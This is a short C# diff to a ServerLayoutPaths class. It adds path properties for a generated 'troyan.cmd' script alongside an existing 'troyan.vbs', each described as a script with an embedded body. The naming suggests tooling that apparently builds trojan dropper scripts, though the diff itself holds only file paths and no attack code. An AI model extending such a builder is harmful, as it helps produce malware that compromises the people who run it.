@@ -43,6 +43,9 @@ public sealed class ServerLayoutPaths
     /// <summary>Plain VBS + embedded body script in Troyan <c>_output</c> (copied to <see cref="UserTroyanVbs"/>).</summary>
     [JsonPropertyName("troyanOutputVbs")] public string TroyanOutputVbs => Path.Join(TroyanOutputDir, "troyan.vbs");
 
+    /// <summary>Plain CMD + embedded body script in Troyan <c>_output</c> (copied to <see cref="UserTroyanCmd"/>).</summary>
+    [JsonPropertyName("troyanOutputCmd")] public string TroyanOutputCmd => Path.Join(TroyanOutputDir, "troyan.cmd");
+
     public string UserDataFile(string file) => _paths.UserDataFile(file);
 
     [JsonPropertyName("userBody")] public string UserBody => _paths.UserDataBody;
@@ -54,4 +57,5 @@ public sealed class ServerLayoutPaths
     [JsonPropertyName("defaultsEmbedDir")] public string DefaultsEmbedDir => _paths.DefaultsEmbedDir;
     [JsonPropertyName("userServerFile")] public string UserServerFile => Path.Combine(UserDataDir, "server.json");
     [JsonPropertyName("userTroyanVbs")] public string UserTroyanVbs => Path.Join(UserDataDir, "troyan.vbs");
+    [JsonPropertyName("userTroyanCmd")] public string UserTroyanCmd => Path.Join(UserDataDir, "troyan.cmd");
 }
